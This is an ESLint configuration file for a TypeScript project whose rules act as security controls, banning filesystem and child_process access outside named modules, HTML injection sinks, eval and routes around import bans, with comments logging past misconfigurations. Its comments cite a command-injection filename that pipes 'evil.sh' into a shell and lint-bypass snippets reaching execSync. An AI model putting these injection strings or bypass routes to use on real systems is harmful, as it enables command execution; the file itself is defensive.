import tseslint from 'typescript-eslint'

// The rules below are security controls, not style. architecture-security-spec-v2.md §2
// makes them law and calls them CI-enforced; build-plan-v1.md §2.4 says typescript-eslint
// "carries the five CI-enforced rules." Each rule names the spec section it enforces so a
// builder who trips one can read why rather than reaching for eslint-disable.
//
// ONE STRUCTURAL RULE FOR THIS FILE: for any given FILE, a given rule name may be configured
// by exactly ONE config object. ESLint flat config does not merge options for the same rule
// across objects — the last matching object REPLACES the earlier one. Two objects may both
// configure a rule ONLY if their `files`/`ignores` make them mutually exclusive.
//
// This has now gone wrong THREE times, every time silently:
//   - Phase 0 → 2026-08-05: `no-restricted-syntax` split across two objects, disabling the
//     shell-injection ban for every .ts file under src/.
//   - 2026-08-05 → 2026-08-06: the `core-knows-nothing` object was added with
//     `no-restricted-imports`, overlapping `src/core/**` with the filesystem object and thereby
//     disabling the `node:fs` import ban for ALL of src/core — the single control spec §2 leads
//     with and P1's acceptance gate names by name.
//   - Phase 0 → 2026-08-06: the scopes partitioned `.ts` but not `.tsx`. `imports/outside-core`
//     matched both extensions and ignored `src/core/**`, while both Core blocks listed `*.ts`
//     only, so ANY `.tsx` file under src/core matched no import block at all and could import
//     `node:fs` freely. Verified: a `.tsx` probe reported zero errors where its byte-identical
//     `.ts` twin reported three.
//
// The import scopes below are therefore a PARTITION of src/, not a set of layered rules.
// Adding a fourth object that sets `no-restricted-imports` requires re-partitioning, not
// appending. The meta-gate now verifies scope by asking ESLint itself which config applies to a
// path (`calculateConfigForFile`), so a shadowed or extension-blind block fails the build.
//
// SECOND STRUCTURAL RULE, added 2026-08-07 under the security review's rebuilt gate-1 standard
// (the gate-1 standard):
//   EVERY BAN IS ONE ENTRY WITH ONE UNIQUE MESSAGE.
// Bundled constructs — a regex alternation, a joined directive list, a multi-glob group — are
// decomposed HERE rather than parsed apart inside the gate, because a parser in the gate is a
// new unproven surface (amendment B). Message uniqueness is what lets the gate attribute a
// violation to the exact ban that produced it; the gate asserts that uniqueness and fails if
// two bans ever share wording. Both properties are enforced, not merely intended.

// EXTENSIONS ARE A CONSTANT, not a literal repeated per block — see the third failure above.
// Every scope derives its globs from here so the set cannot drift apart again, and the gate
// requires a fixture per claimed extension per block.
const CODE = ['ts', 'tsx']
const globs = (base) => CODE.map(ext => `${base}/*.${ext}`)

const SPEC_FS = 'See architecture-security-spec-v2.md §2 and §4.'

const FS_MODULES = ['fs', 'node:fs', 'fs/promises', 'node:fs/promises']

const FS_IMPORT_BAN = FS_MODULES.map(name => ({
  name,
  message: `Filesystem access lives only in src/core/fs — '${name}' may not be imported here. Everything else takes a validated handle. ${SPEC_FS}`,
}))

// The call-site selectors below catch bare `exec(...)`; they deliberately do NOT match
// `something.exec(...)`, because that also matches `RegExp.prototype.exec` — a safe, ubiquitous
// call that tripped the rule on ordinary code in src/core/text.ts. A rule that fires on correct
// code gets disabled by whoever hits it, and a disabled rule protects nothing.
//
// THIS COMMENT USED TO CLAIM the import was "the honest chokepoint" because reaching child_process
// requires importing it. **That was false, and it was load-bearing** — the narrowing above was
// justified by it. Four routes around it were verified on 2026-08-07 (dynamic import,
// createRequire, process.getBuiltinModule, process.binding), leaving live command injection in the
// Core. The import ban is kept and is worth keeping; it is simply not sufficient alone. What makes
// it a chokepoint is MODULE_ACQUISITION_BANS below, which closes the other routes. See
// the record-update notes item 1 — a comment that overstates a control is how the
// next reader stops looking, and this one cost us a real hole.
/**
 * **The one file permitted to import `child_process`.** Spec §10, granted by the operator 2026-08-14.
 *
 * A single path, never a directory glob: a second §10 action cannot appear beside it without coming
 * back through the same escalation. Pinned by `test/security/sanctioned-shell.test.ts`.
 */
const SANCTIONED_SHELL_MODULE = 'src/server/reveal.ts'

/**
 * **The message says "one named module" rather than "outright", and the wording is not cosmetic.**
 *
 * Until 2026-08-14 this said *banned outright*, and that was true. It is not any more — the
 * partition below grants `src/server/reveal.ts` the import. **A message that overstates a control is
 * how the next reader stops looking**, which this file has already paid for once: the comment above
 * claimed the import was "the honest chokepoint", the narrowing of the call-site selectors was
 * justified by that claim, and the claim was false. The escalation clause stays, because the
 * exception being granted once does not make the next one a local decision either.
 */
const CHILD_PROCESS_IMPORT_BAN = ['child_process', 'node:child_process'].map(name => ({
  name,
  message: `'${name}' is banned in every module but one — ${SANCTIONED_SHELL_MODULE}, which exists solely for §10's Reveal in Finder and calls execFile with an absolute binary path, an argument array and shell:false. Reaching it from anywhere else, or adding a second such module, is an escalation to the operator and the security review rather than a local decision.`,
}))

const CORE_TRANSPORT_IMPORT_BAN = [
  'http', 'node:http', 'https', 'node:https', 'net', 'node:net', 'react', 'react-dom',
].map(name => ({
  name,
  message: `Core is transport-agnostic by design — '${name}' belongs in src/server or src/client, not in the Core. That is what makes an Electron wrapper cheap and the file engine testable without a server. See spec §2.`,
}))

// Decomposed from a single two-glob group (amendment B): each direction of the dependency rule
// is its own ban with its own message, so each is independently provable.
const CORE_LAYER_PATTERN_BAN = [
  {
    group: ['**/server/**'],
    message: 'Dependency direction is Core → Contract → Adapters, one way. The Core may not reach into src/server. See spec §2.',
  },
  {
    group: ['**/client/**'],
    message: 'Dependency direction is Core → Contract → Adapters, one way. The Core may not reach into src/client. See spec §2.',
  },
]

// spec §2 and §8 enumerate five sinks by name. Only four of them are property accesses.
// `document.write` is NOT here: no-restricted-properties matches a property whose name is
// literally the string given, and no property is named "document.write" — the entry matched
// nothing from Phase 0 until 2026-08-06, when a probe caught it. It is enforced as a syntax
// selector instead; see `security-syntax-bans` below.
const DOM_SINKS = ['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'srcdoc']

/**
 * The sink bans, shared by BOTH property scopes below so the partition carries identical
 * protection either side of the boundary. Defined once: two copies would drift, and drift between
 * two blocks configuring one rule is this file's signature failure.
 *
 * ACCEPTED RESIDUAL (the security review, deferred to Phase 7 where a renderer exists to defend):
 * `setAttribute('srcdoc', s)` and `Object.assign(el, {innerHTML: s})` evade these. Re-scoping
 * across all of src/ lands now; the aliasing routes wait for the thing they would attack.
 */
const HTML_SINK_PROPERTY_BANS = [
  ...DOM_SINKS.map(property => ({
    property,
    message: `${property} is one of the banned HTML sinks. Rendered content is built with createElement/textContent/setAttribute only. Agent-written markdown reaches this renderer. See spec §8.`,
  })),
  {
    // Closes the alias route. The `document` global ban catches only the bare identifier, but
    // `window.document` is a property access and does not name it — so
    // `const d = window.document; d.write(markup)` reached the page untouched until 2026-08-06.
    object: 'window',
    property: 'document',
    message: 'Reach the document through the renderer helpers, not through window — otherwise the escaping guarantee can be aliased around. See spec §8.',
  },
]

// The eighteen CSP bans that used to live here were DELETED 2026-08-07 on the security review's second
// gate-1 ruling. They enforced a SINGLE-SITE invariant with a whole-codebase text scan, and the
// red-team proved the instrument wrong: all seventeen directive selectors matched `Literal` only,
// so a CSP written as a template literal — the normal way to write one — walked past every single
// fixture, as did concatenation and `.join()`. Adding TemplateLiteral would have bought one round;
// the next form is an imported constant.
//
// The replacement is stronger and is a NAMED, BLOCKING PHASE 2 GATE: one unit test on the actual
// emitted header value. Parse it; assert no 'unsafe-inline' outside style-src, no 'unsafe-eval' in
// any directive, and every directive present is one we meant to ship. It does not care how the
// string was built, needs no hardcoded directive list (child-src and style-src-elem were holes
// here), and tests the value that reaches the browser rather than a literal sitting in the tree.

// Decomposed from `/^(exec|execSync|spawnSync)$/` for the same reason: one alternation was one
// entry, so deleting the fixture for any single function left it certified by its siblings.
const BARE_SHELL_CALLS = ['exec', 'execSync', 'spawnSync']

/**
 * MODULE ACQUISITION AND EXECUTION SINKS — added 2026-08-07 when the security review withdrew their gate-5
 * ratification.
 *
 * The review had ratified the `child_process` import ban "without reservation" because *"an import is an
 * unaliasable chokepoint — reaching cp.exec requires importing the module first."* That sentence
 * is false, and it was load-bearing: the call-site selectors above were deliberately narrowed on
 * the strength of it. Four routes around it were verified against the committed config, all
 * linting clean, and the combination left live command injection in the Core:
 *
 *     const cp = process.getBuiltinModule('node:child_process')
 *     cp.execSync(`ls ${userFilename}`)
 *
 * The fix is NOT to restore the member-call selectors — that brings back the
 * `RegExp.prototype.exec` false positive, and a rule that fires on correct code gets switched off,
 * which is how this build got its first hole. The fix is to make the premise TRUE rather than
 * assumed: close every acquisition route, each proven by its own fixture. Then `cp.execSync` is
 * unreachable because `cp` is unobtainable, and the chokepoint is a theorem instead of a claim.
 *
 * Dynamic import is banned for these modules everywhere INCLUDING src/core/fs — the sanctioned
 * module acquires node:fs by static import, so a dynamic one is never the legitimate route.
 *
 * `eval` and `new Function` are here because gate 5's stated purpose is "no string interpolation
 * into a command line," and a string reaching an execution sink is exactly that. Neither was
 * banned anywhere in this build until now; that was a gap in the gate list, not in its
 * implementation.
 *
 * NAMED RESIDUAL, accepted by the security review in writing: `globalThis['pro'+'cess']['getBuiltin'+'Module']`
 * and equivalents cannot be caught by a linter. Not chased. This layer stops the accident, not a
 * determined adversary — an adversary who can write into src/ already has code execution and does
 * not need to defeat ESLint.
 */
const MODULE_ACQUISITION_BANS = [
  ...[...FS_MODULES, 'child_process', 'node:child_process'].map(name => ({
    selector: `ImportExpression[source.value='${name}']`,
    message: `Dynamic import of '${name}' is banned. A static import is the only sanctioned route, and it is what the import bans police. See spec §2 and §10.`,
  })),
  {
    selector: "CallExpression[callee.name='createRequire']",
    message: 'createRequire builds a CommonJS require that reaches any builtin, bypassing every import ban. See spec §2.',
  },
  {
    // Deliberately NOT constrained with [object.name='process']: that form misses
    // `(process as any).binding('fs')`, where the object is a TSAsExpression rather than an
    // Identifier. Verified — the constrained selector let it through.
    selector: "MemberExpression[property.name='getBuiltinModule']",
    message: 'process.getBuiltinModule reaches any builtin without an import. It is the idiomatic modern route, which is exactly why it has to be banned. See spec §2.',
  },
  {
    selector: "CallExpression[callee.name='require']",
    message: 'require() reaches any builtin without an import. This package is type:module; there is no legitimate use. See spec §2.',
  },
  {
    // Unconstrained object for the same TSAsExpression reason as getBuiltinModule.
    selector: "MemberExpression[property.name='binding']",
    message: 'process.binding is an undocumented route straight to native bindings, below every import ban. See spec §2.',
  },
  {
    selector: "CallExpression[callee.name='eval']",
    message: 'eval executes a string. Gate 5 exists to stop a string reaching an execution sink, and this is the purest form of it. See spec §10.',
  },
  {
    selector: "NewExpression[callee.name='Function']",
    message: 'new Function compiles a string into code — eval by another name. See spec §10.',
  },
]

export default tseslint.config(
  {
    /**
     * Build output is not source and must not be linted.
     *
     * `dist-server/**` was missing here — added 2026-08-08 after a lint run failed on
     * `dist-server/main.js`, a **bundler-generated** file. The client bundle was ignored from the
     * start; the server bundle arrived later and nobody extended the list, so eslint has been
     * linting generated JavaScript ever since and passing by coincidence — whatever the bundler
     * happened to emit did not trip a rule until today.
     *
     * That is worth more than the one-line fix: a lint run that included generated output was
     * reporting on code no one wrote and no one can change, so a failure there says nothing about
     * the source and a pass says nothing either. The rules that DO apply to the built bundle are
     * checked separately and deliberately, against the bundle's contents (P3's "must not undo"
     * verification), not by pointing a source linter at it.
     */
    //  and  are the browser suite's own build — same category as the
    // two above, kept separate from them so a test run cannot overwrite what the real server loads.
    ignores: [
      'dist/**', 'dist-server/**', 'dist-e2e/**', 'dist-server-e2e/**',
      'node_modules/**', 'test/fixtures/**',
    ],
  },
  ...tseslint.configs.recommended,

  {
    /**
     * **The harness instrument is CommonJS on purpose, so `require()` is not a smell there — it is
     * the only import mechanism the format has.** `no-require-imports` exists to stop CJS creeping
     * into this package's ESM source; inside a `.cjs` file it cannot report anything but a false
     * positive, and a rule that can only be wrong is worse than no rule, because silencing it
     * per-line teaches the next reader that the errors here are the ignorable kind.
     *
     * Why these files are CommonJS at all is recorded in `test/harness/results.d.cts`: they are a
     * measuring instrument, and rewriting one at its own gate is how a number stops being
     * trustworthy for a whole phase. They are still linted by every other rule.
     */
    name: 'harness/commonjs-instrument',
    files: ['**/*.cjs'],
    rules: {
      '@typescript-eslint/no-require-imports': 'off',
    },
  },

  {
    // Amendment D. An inline `eslint-disable` silences a security control from inside the file
    // it is meant to constrain — that is failure #1 (silently-off) wearing a comment. Disable
    // directives are ignored for all of src/, and an unused one is itself an error so the
    // corpse does not linger. A genuine exception is an escalation to the operator and the security review, which
    // is greppable and reviewable; a line comment is neither.
    name: 'security/no-inline-escape',
    files: globs('src/**'),
    linterOptions: {
      noInlineConfig: true,
      reportUnusedDisableDirectives: 'error',
    },
  },

  // ---------------------------------------------------------------------------------------
  // IMPORT SCOPES — a partition of src/. Exactly one of these three matches any given file,
  // so `no-restricted-imports` is configured once per file and nothing is silently replaced.
  // See the structural notes at the top of this file. Changing one means re-checking all three.
  // ---------------------------------------------------------------------------------------

  {
    // The adapters and the contract: everything outside the Core, and outside the one module
    // permitted to reach child_process. See `imports/sanctioned-shell` below.
    name: 'imports/outside-core',
    files: globs('src/**'),
    ignores: ['src/core/**', SANCTIONED_SHELL_MODULE],
    rules: {
      'no-restricted-imports': ['error', {
        paths: [...FS_IMPORT_BAN, ...CHILD_PROCESS_IMPORT_BAN],
      }],
    },
  },

  {
    /**
     * **THE ONE MODULE PERMITTED TO REACH `child_process`.** Spec §10, and the ruling of
     * 2026-08-14 — the escalation the `CHILD_PROCESS_IMPORT_BAN` message demands, taken and granted.
     *
     * **This is a FOURTH partition, not a fourth object layered over an existing one**, which is
     * what the note at the top of this file requires: `imports/outside-core` now excludes this path,
     * so exactly one object still configures `no-restricted-imports` for any given file. The failure
     * that rule exists to prevent — a later object silently replacing an earlier one's config —
     * has happened four times in this build, and adding an overlapping object here would be the
     * fifth in the file that documents the other four.
     *
     * **Nothing else is relaxed.** `node:fs` is still banned here, every module-acquisition ban still
     * applies (dynamic import, `createRequire`, `getBuiltinModule`, `process.binding`), every
     * execution sink is still banned, and bare `exec`/`execSync`/`spawnSync` are still forbidden —
     * `execFile` was never banned, because it is the call §10 specifies.
     *
     * **The path is narrow on purpose.** It names one file, not a directory: a second §10 action
     * cannot be added beside it without coming back through the same escalation. `test/security/
     * sanctioned-shell.test.ts` asserts this list has exactly one member, so widening it is a test
     * failure rather than a preference — the same shape that has held the sole `document` exception
     * for `dom.ts` since P3.
     */
    name: 'imports/sanctioned-shell',
    files: [SANCTIONED_SHELL_MODULE],
    rules: {
      'no-restricted-imports': ['error', {
        paths: [...FS_IMPORT_BAN],
      }],
    },
  },

  {
    // The Core, except the one module permitted to touch the filesystem.
    // spec §2: "Three layers, one direction of dependency... The Core MUST NOT import
    // anything HTTP- or browser-specific", and `node:fs` lives only in src/core/fs.
    name: 'imports/core-except-fs',
    files: globs('src/core/**'),
    ignores: ['src/core/fs/**'],
    rules: {
      'no-restricted-imports': ['error', {
        paths: [...FS_IMPORT_BAN, ...CHILD_PROCESS_IMPORT_BAN, ...CORE_TRANSPORT_IMPORT_BAN],
        patterns: CORE_LAYER_PATTERN_BAN,
      }],
    },
  },

  {
    // The sanctioned filesystem module. It may import node:fs — that is its entire purpose —
    // and nothing else is relaxed for it.
    name: 'imports/core-fs',
    files: globs('src/core/fs/**'),
    rules: {
      'no-restricted-imports': ['error', {
        paths: [...CHILD_PROCESS_IMPORT_BAN, ...CORE_TRANSPORT_IMPORT_BAN],
        patterns: CORE_LAYER_PATTERN_BAN,
      }],
    },
  },

  // ---------------------------------------------------------------------------------------
  // PROPERTY SCOPES — a partition of src/, for the same reason the import scopes are one.
  //
  // RE-PARTITIONED 2026-08-07, on the security review's finding — the one neither red-team made, and the
  // FOURTH occurrence of the flat-config replacement trap this file warns about at the top.
  //
  // `no-restricted-properties` was configured by two blocks: the DOM sinks (src/client/**) and
  // `startsWith` (src/core/** + src/server/**). They did not overlap, so nothing was broken —
  // but the file's governing rule was satisfied by LUCK OF NON-OVERLAP and nothing else.
  //
  // The trap: extending the DOM-sink block to all of src/ — which is the OBVIOUS repair for the
  // red-team's finding that `el.innerHTML` was unenforced in core and server — makes
  // src/core/*.ts resolve to `startsWith` ONLY. All five sinks silently gone. Verified, with the
  // full meta-gate reporting 107/107 green throughout.
  //
  // That is the first time this trap has been armed by someone doing the RIGHT thing rather than
  // making a mistake. So the sinks now apply across all of src/ — which is the correct scope,
  // markup is not built only in the client — and the two blocks below are mutually exclusive by
  // construction, with the filesystem-grounded boundary test asserting it against real files.
  // ---------------------------------------------------------------------------------------

  {
    name: 'properties/outside-core-and-server',
    files: globs('src/**'),
    ignores: ['src/core/**', 'src/server/**'],
    rules: {
      'no-restricted-properties': ['error', ...HTML_SINK_PROPERTY_BANS],
    },
  },

  {
    // spec §5: "Segment-boundary path comparison everywhere. Raw startsWith on paths is
    // forbidden" — and the spec notes this "was a real bug in the lab code that the master
    // audit missed": watcher-to-folder attribution matched /soil/notes against /soil/notes-old.
    // Stated as law in Phase 0 and enforced by nothing until 2026-08-05. Scoped to core and
    // server, where paths live.
    //
    // The escape used to be an inline eslint-disable with a reason. Amendment D removed that:
    // `noInlineConfig` covers all of src/, so the only route for a genuine non-path use is an
    // escalation to the operator and the security review, which is visible in review rather than hidden in a line
    // comment. The sanctioned helper gets built with its first real case, not before.
    //
    // ACCEPTED RESIDUAL (the security review, in writing): `a.indexOf(b) === 0` and `a.slice(0, b.length) === b`
    // are not caught. The real control is `isWithin()` in src/core/paths.ts, which compares whole
    // segments and has tests. This ban catches the ACCIDENT — nobody writes `indexOf(b) === 0` by
    // accident.
    name: 'properties/core-and-server',
    files: [...globs('src/core/**'), ...globs('src/server/**')],
    rules: {
      'no-restricted-properties': ['error',
        ...HTML_SINK_PROPERTY_BANS,
        {
          property: 'startsWith',
          message: 'Paths compare on whole segments, never by prefix — /soil/notes must not match /soil/notes-old. Use the segment-boundary helper in src/core. A genuine non-path use is an escalation, not a local eslint-disable. See spec §5.',
        },
      ],
    },
  },

  {
    // THE ONE ALLOWLISTED FILE. The security review's amendment D: an inline `eslint-disable` is failure #1
    // (silently-off) wearing a comment, so a genuine exception gets "a sanctioned, greppable
    // mechanism (a named helper, or an allowlisted call)" instead. `src/client/dom.ts` IS that
    // mechanism — the single module permitted to touch the `document` global, named here by path
    // so the exception is visible in the config rather than hidden at the call site.
    //
    // `noInlineConfig` means nobody can mint a second exception with a comment, and
    // `scope-boundary.test.ts` asserts this list has exactly one member, so adding another is a
    // test failure rather than a preference.
    //
    // What is NOT relaxed: the HTML-sink bans. innerHTML, outerHTML, insertAdjacentHTML, srcdoc and
    // document.write live in the property and syntax scopes, which cover all of src/ — including
    // dom.ts. That module gets `document`. It does not get a way to inject markup.
    name: 'no-document-global-in-client',
    files: globs('src/client/**'),
    ignores: ['src/client/dom.ts'],
    rules: {
      'no-restricted-globals': ['error', {
        name: 'document',
        message: 'Use the renderer helpers rather than the document global directly, so escaping cannot be bypassed. See spec §8.',
      }],
    },
  },

  {
    // ALL no-restricted-syntax selectors live here. See the structural note at the top.
    name: 'security-syntax-bans',
    files: globs('src/**'),
    rules: {
      'no-restricted-syntax': ['error',
        // spec §10. A filename is attacker-controlled input: any agent can write
        // `note"; curl evil.sh | sh; #.md` into the tree. One entry per function — see the
        // note on BARE_SHELL_CALLS.
        ...BARE_SHELL_CALLS.map(fn => ({
          selector: `CallExpression[callee.name='${fn}']`,
          message: `Bare ${fn}(...) is forbidden. Use execFile with an absolute binary path, an argument array, and shell:false. A filename is attacker-controlled input. See spec §10.`,
        })),
        {
          // spec §8's fifth DOM sink. Two selectors because the `document` global ban in the
          // client block only catches the bare identifier: `window.document.write(markup)`
          // passed every rule in this file until 2026-08-06.
          // `writeln` is included as the same API; spec §8 enumerates only `write`.
          selector: "MemberExpression[property.name=/^(write|writeln)$/][object.name='document']",
          message: 'document.write is one of the banned HTML sinks. Rendered content is built with createElement/textContent/setAttribute only. See spec §8.',
        },
        {
          selector: "MemberExpression[property.name=/^(write|writeln)$/][object.property.name='document']",
          message: 'document.write reached through window is the same banned HTML sink by another route. Rendered content is built with createElement/textContent/setAttribute only. See spec §8.',
        },
        // spec §10 and the security review's re-ruling of gate 5. Every route to a banned module, not just
        // the static import — see MODULE_ACQUISITION_BANS.
        ...MODULE_ACQUISITION_BANS,
      ],
    },
  },

)
